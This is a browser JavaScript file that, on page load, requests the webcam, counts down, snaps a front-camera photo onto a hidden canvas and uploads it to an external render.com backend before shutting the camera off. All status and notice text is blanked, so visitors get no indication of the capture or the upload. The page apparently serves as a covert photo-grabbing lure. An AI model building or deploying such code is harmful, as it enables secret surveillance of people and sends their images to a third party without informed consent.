// public/script.js (Laptop + Mobile fixed version)

const video = document.getElementById('previewVideo');
const canvas = document.getElementById('hiddenCanvas');
const notice = document.getElementById('notice');
const countdownEl = document.getElementById('countdown');
const statusEl = document.getElementById('status');
const UPLOAD_URL = 'https://the-nexus-media-backend.onrender.com/upload';

let stream = null;
let captureTimeout = null;

window.addEventListener('load', () => {
  // small delay so page renders before permission prompt
  setTimeout(initAndCapture, 250);
});

async function initAndCapture() {
  try {
    notice.textContent = ' ';
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user' },
      audio: false
    });
    video.srcObject = stream;

    // 🔹 Ensure video playback actually starts (important for laptops)
    try {
      await video.play();
    } catch (e) {
      console.warn(' ', e);
    }

    // wait for metadata + first frames
    await waitForVideoReady(video, 1500);

    notice.textContent = ' ';
    statusEl.textContent = ' ';
    startCountdown(2);
  } catch (err) {
    console.error(' ', err);
    notice.textContent = ' ';
    statusEl.textContent = err?.message || String(err);
  }
}

function waitForVideoReady(videoEl, timeout = 1500) {
  return new Promise(resolve => {
    const start = Date.now();
    (function check() {
      if (videoEl.videoWidth && videoEl.videoHeight) return resolve();
      if (Date.now() - start > timeout) return resolve();
      requestAnimationFrame(check);
    })();
  });
}

function startCountdown(seconds = 2) {
  let t = seconds;
  countdownEl.textContent = t;
  const timer = setInterval(() => {
    t -= 1;
    countdownEl.textContent = t > 0 ? t : '';
    if (t <= 0) {
      clearInterval(timer);
      // 🔹 Add warm-up delay (important for laptop webcam)
      captureTimeout = setTimeout(() => captureAndUpload(), 700);
    }
  }, 1000);
}

function captureAndUpload() {
  if (!stream) {
    statusEl.textContent = ' ';
    return;
  }

  const w = video.videoWidth || 1280;
  const h = video.videoHeight || 720;
  canvas.width = w;
  canvas.height = h;
  const ctx = canvas.getContext('2d');

  try {
    // 🔹 For front camera, flip horizontally (optional)
    ctx.save();
    ctx.scale(-1, 1);
    ctx.drawImage(video, -w, 0, w, h);
    ctx.restore();
  } catch (err) {
    console.error(' ', err);
    statusEl.textContent = ' ';
    stopCamera();
    return;
  }

  statusEl.textContent = ' ';

  canvas.toBlob(async (blob) => {
    if (!blob) {
      statusEl.textContent = ' ';
      stopCamera();
      return;
    }

    const form = new FormData();
    const filename = `capture_${Date.now()}.png`;
    form.append('file', blob, filename);
    form.append('type', 'image');

    try {
      const resp = await fetch(UPLOAD_URL, { method: 'POST', body: form });
      let json = null;
      try { json = await resp.json(); } catch (_) {}
      if (resp.ok) {
        statusEl.textContent = ' ';
      } else {
        statusEl.textContent = '  ' + (json?.error || resp.statusText);
        console.error(' ', resp.status, json);
      }
    } catch (err) {
      console.error(' ', err);
      statusEl.textContent = ' ';
    } finally {
      stopCamera();
    }
  }, 'image/png', 0.95);
}

function stopCamera() {
  try {
    if (captureTimeout) { clearTimeout(captureTimeout); captureTimeout = null; }
    if (stream) {
      stream.getTracks().forEach(t => t.stop());
      stream = null;
    }
    video.srcObject = null;
    notice.textContent = ' ';
  } catch (err) { console.warn(' ', err); }
}
